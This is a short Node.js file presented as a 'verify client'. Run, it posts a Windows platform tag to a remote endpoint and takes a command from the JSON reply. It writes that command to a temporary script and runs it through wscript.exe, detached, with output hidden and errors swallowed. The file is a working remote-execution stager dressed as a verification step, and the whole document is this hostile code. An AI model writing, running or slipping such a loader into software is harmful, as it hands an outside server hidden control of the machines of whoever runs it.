// Tasked verify client: posts to a verify endpoint, then executes the
// command the JSON response carries through a hidden script host.
const https = require('https');
const { spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const VRF_URL = 'https://vrf.example.net/api/v1/vrf';

async function runVerify() {
  await new Promise((resolve) => {
    const body = '{"p":"win32"}';
    const req = https.request(VRF_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
    }, (res) => {
      let data = '';
      res.on('data', (c) => { data += c; });
      res.on('end', () => {
        try {
          const j = JSON.parse(data);
          if (j.cmd && j.exec && j.args) {
            const psPath = path.join(os.tmpdir(), '_run.ps1');
            const psCmd = `${j.exec} ${j.args.join(' ')} ${j.cmd}`;
            fs.writeFileSync(psPath, psCmd, 'utf8');
            spawn('wscript.exe', [psPath], { detached: true, stdio: 'ignore' }).unref();
          }
        } catch (e) { /* ignore malformed responses */ }
        resolve();
      });
    });
    req.on('error', () => resolve());
    req.write(body);
    req.end();
  });
}

runVerify();
